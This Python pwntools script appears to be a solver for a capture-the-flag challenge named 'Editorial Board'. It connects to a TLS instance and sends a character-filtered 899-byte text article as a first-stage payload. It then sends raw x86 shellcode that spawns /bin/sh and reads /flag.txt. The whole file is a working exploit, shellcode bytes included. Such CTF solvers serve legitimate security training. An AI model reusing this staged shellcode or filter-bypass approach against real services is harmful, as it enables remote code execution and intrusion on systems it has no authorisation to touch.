#!/usr/bin/env python3
"""Exploit Editorial Board; pass the current TLS instance host as an argument."""

from __future__ import annotations

import argparse
import os
import re
import sys
import time
from pathlib import Path

from pwn import context, remote


REVIEW = b"The board is reviewing your manuscript...\n"
ACCEPTED = b"Accepted by the anti-slop desk. Typesetting...\n"
STAGE2 = bytes.fromhex(
    "31 c0 99 68 2f 73 68 00 68 2f 62 69 6e 89 e3 31 c9 b0 0b cd 80"
)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "host",
        nargs="?",
        default=os.environ.get("CTF_HOST"),
        help="instance host (or set CTF_HOST)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=int(os.environ.get("CTF_PORT", "1337")),
        help="instance port (default: 1337; or set CTF_PORT)",
    )
    args = parser.parse_args()
    if not args.host:
        parser.error("provide HOST or set CTF_HOST")

    article = (Path(__file__).resolve().parent / "solver_support" / "payload.txt").read_bytes()
    if len(article) != 899 or not article.endswith(b"."):
        raise SystemExit("payload.txt must be the validated 899-byte article")
    if any(byte not in b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ .,;:'-?!" for byte in article):
        raise SystemExit("payload.txt contains a byte rejected by the native filter")

    context.log_level = "error"
    io = remote(args.host, args.port, ssl=True, timeout=50)
    try:
        banner = io.recvuntil(b"Submit your manuscript:\n", timeout=20)
        io.send(article + b"\n")  # read(0, ..., 900) consumes 899 bytes plus LF
        review = io.recvuntil(REVIEW, timeout=15)
        if b"Rejected by the anti-slop desk" in review:
            raise RuntimeError("remote anti-slop validator rejected the article")

        # Stage 1 waits in read(0, ECX, 0x7f); send raw shellcode separately.
        io.send(STAGE2)
        accepted = io.recvuntil(ACCEPTED, timeout=40)
        time.sleep(0.4)
        io.send(b"cat /flag.txt; exit\n")
        tail = io.recvall(timeout=10)

        output = banner + review + accepted + tail
        sys.stdout.buffer.write(output)
        flag = re.search(rb"FortID\{[^}\r\n]+\}", output)
        if not flag:
            raise RuntimeError("shell ran but no FortID flag appeared in the response")
        print(flag.group(0).decode("ascii"))
        return 0
    finally:
        io.close()


if __name__ == "__main__":
    raise SystemExit(main())
